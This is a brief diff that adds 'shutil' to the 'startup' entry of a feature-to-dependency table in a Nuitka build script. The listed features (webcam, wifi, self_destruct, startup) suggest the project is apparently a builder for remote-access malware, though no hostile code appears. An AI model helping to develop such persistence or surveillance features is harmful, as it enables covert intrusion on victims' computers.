@@ -629,7 +629,7 @@ Nuitka - Builds a standalone executable file with the necessary modules inside o
                 "self_destruct": ["subprocess"],
                 "wifi": ["subprocess"],
                 "webcam": ["cv2"],
-                "startup": ["subprocess"],
+                "startup": ["shutil", "subprocess"],
                 "games": ["subprocess"]
             }
 
